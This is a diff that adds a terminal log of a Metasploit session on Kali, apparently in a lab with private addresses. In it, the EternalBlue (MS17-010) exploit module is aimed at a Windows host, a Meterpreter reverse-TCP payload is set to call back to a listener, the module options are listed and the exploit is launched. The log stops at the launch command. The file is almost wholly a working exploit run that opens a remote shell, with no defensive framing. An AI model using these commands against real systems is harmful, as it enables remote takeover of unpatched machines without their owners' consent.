@@ -1,0 +1,62 @@
+root@Kali:~# msfconsole
+                                                  
+IIIIII    dTb.dTb        _.---._
+  II     4'  v  'B   .'"".'/|\`.""'.
+  II     6.     .P  :  .' / | \ `.  :
+  II     'T;. .;P'  '.'  /  |  \  `.'
+  II      'T; ;P'    `. /   |   \ .'
+IIIIII     'YvP'       `-.__|__.-'
+
+I love shells --egypt
+
+
+       =[ metasploit v4.16.6-dev                          ]
++ -- --=[ 1682 exploits - 964 auxiliary - 297 post        ]
++ -- --=[ 498 payloads - 40 encoders - 10 nops            ]
++ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]
+
+msf > use exploit/windows/smb/ms17_010_eternalblue
+msf exploit(ms17_010_eternalblue) > set RHOST 192.168.21.150
+RHOST => 192.168.21.150
+msf exploit(ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+msf exploit(ms17_010_eternalblue) > set LHOST 192.168.21.130
+LHOST => 192.168.21.130
+msf exploit(ms17_010_eternalblue) > show options
+
+Module options (exploit/windows/smb/ms17_010_eternalblue):
+
+   Name                Current Setting  Required  Description
+   ----                ---------------  --------  -----------
+   GroomAllocations    12               yes       Initial number of times to groom the kernel pool.
+   GroomDelta          5                yes       The amount to increase the groom count by per try.
+   MaxExploitAttempts  3                yes       The number of times to retry the exploit.
+   ProcessName         spoolsv.exe      yes       Process to inject payload into.
+   RHOST               192.168.21.150   yes       The target address
+   RPORT               445              yes       The target port (TCP)
+   SMBDomain           .                no        (Optional) The Windows domain to use for authentication
+   SMBPass                              no        (Optional) The password for the specified username
+   SMBUser                              no        (Optional) The username to authenticate as
+   VerifyArch          true             yes       Check if remote architecture matches exploit Target.
+   VerifyTarget        true             yes       Check if remote OS matches exploit Target.
+
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.21.130   yes       The listen address
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
+
+
+msf exploit(ms17_010_eternalblue) > show econders
+[-] Invalid parameter "econders", use "show -h" for more information
+msf exploit(ms17_010_eternalblue) > exploit
